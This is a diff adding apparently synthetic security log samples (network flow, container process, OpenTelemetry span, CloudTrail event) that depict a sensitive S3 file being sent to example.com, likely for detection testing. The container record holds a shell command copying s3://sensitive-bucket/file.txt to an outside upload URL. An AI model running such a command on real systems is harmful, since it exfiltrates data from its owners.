@@ -1,0 +1,85 @@
+Network:
+{
+  "timestamp": "2024-08-20T12:34:56Z",
+  "src_pod": "myapp-pod-1234",
+  "src_namespace": "default",
+  "src_ip": "10.244.1.10",
+  "dst_ip": "198.51.100.10",
+  "dst_port": "443",
+  "protocol": "TCP",
+  "action": "ALLOW",
+  "bytes_sent": 987654,
+  "bytes_received": 12345
+}
+
+Container:
+{
+  "timestamp": "2024-08-20T12:34:58Z",
+  "container_id": "123abc456def",
+  "process": "/bin/sh",
+  "arguments": "-c aws s3 cp s3://sensitive-bucket/file.txt https://example.com/upload",
+  "uid": "1000",
+  "gid": "1000",
+  "exit_code": "0"
+}
+
+Open Telemetry:
+{
+  "timestamp": "2024-08-20T12:34:56Z",
+  "trace_id": "7e573b9e9f5f4b3c82c9f2b654f6b0ab",
+  "span_id": "f2b654f6b0ab4d2a",
+  "name": "third_party_library_function",
+  "status": "OK",
+  "attributes": {
+    "library_name": "vulnerable-library",
+    "external_call": "https://example.com/upload",
+    "http.method": "POST",
+    "http.status_code": 200,
+    "file": "s3://sensitive-bucket/file.txt"
+  }
+}
+
+Cloudtrail:
+{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "AssumedRole",
+    "principalId": "EXAMPLE-PRINCIPAL-ID",
+    "arn": "arn:aws:sts::123456789012:assumed-role/MyAppRole/MyAppInstance",
+    "accountId": "123456789012",
+    "accessKeyId": "EXAMPLE-ACCESS-KEY"
+  },
+  "eventTime": "2024-08-20T12:34:57Z",
+  "eventSource": "s3.amazonaws.com",
+  "eventName": "GetObject",
+  "awsRegion": "us-west-2",
+  "sourceIPAddress": "10.244.1.10",
+  "userAgent": "aws-cli/2.1.29 Python/3.8.8 Linux/4.14.232-176.381.amzn2.x86_64 exe/x86_64.amzn.2",
+  "requestParameters": {
+    "bucketName": "sensitive-bucket",
+    "key": "file.txt"
+  },
+  "responseElements": {
+    "x-amz-request-id": "EXAMPLE-REQUEST-ID",
+    "x-amz-id-2": "EXAMPLE-ID-2"
+  },
+  "additionalEventData": {
+    "CipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
+    "bytesTransferredIn": 123,
+    "bytesTransferredOut": 987654,
+    "SSEApplied": "AES256"
+  },
+  "requestID": "EXAMPLE-REQUEST-ID",
+  "eventID": "EXAMPLE-EVENT-ID",
+  "readOnly": true,
+  "resources": [
+    {
+      "type": "AWS::S3::Object",
+      "ARN": "arn:aws:s3:::sensitive-bucket/file.txt"
+    }
+  ],
+  "eventType": "AwsApiCall",
+  "managementEvent": false,
+  "recipientAccountId": "123456789012",
+  "sharedEventID": "EXAMPLE-SHARED-EVENT-ID"
+}
